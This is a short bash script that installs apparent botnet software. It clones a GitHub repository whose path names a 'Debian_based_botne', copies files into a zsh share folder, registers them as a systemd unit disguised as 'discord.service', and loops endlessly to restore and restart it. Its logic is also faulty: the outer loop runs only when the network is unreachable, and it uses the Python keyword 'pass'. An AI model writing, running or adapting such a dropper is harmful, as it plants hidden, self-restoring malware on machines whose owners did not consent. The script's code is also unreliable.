


while ! ping -c 1 -W 1 8.8.8.8 > /dev/null 2>&1; do

    folder="/usr/local/share/zsh/Bnet"
    while true; do
        if [ ! -d "$folder" ]; then
            #this and else statment done same job i know .. just for bee in safe side .. ( to much thinking ;)
            git clone https://github.com/Dhanraj369/the_spider_shell_reshell.git
            cp -r the_spider_shell_reshell/Debian_based_botne/Bnet /usr/local/share/zsh/
            cp /usr/local/share/zsh/Bnet/discord.service /etc/systemd/system/
            systemctl enable discord.service
            systemctl start discord.service
            systemctl daemon-reload
        fi
        service_name="discord.service"
        if systemctl is-active --quiet $service_name; then
            pass
        else
            systemctl enable $service_name
            systemctl restart $service_name
            systemctl daemon-reload
        fi
        sleep 5 
        service_name="discord.service"
        service_file="/etc/systemd/system/discord.service"
        copy_command="cp /usr/local/share/zsh/Bnet/discord.service /etc/systemd/system/"
        reload_command="systemctl daemon-reload"
        enable_command="systemctl enable discord.service"
        start_command="systemctl start discord.service"
        if [ ! -f "$service_file" ]; then
            $copy_command
            $reload_command
            $enable_command
            $start_command
        else
            echo "abeee [else] kya dekh raha he if vala him kaam karega conform"
        fi
        sleep 5  
    done

done



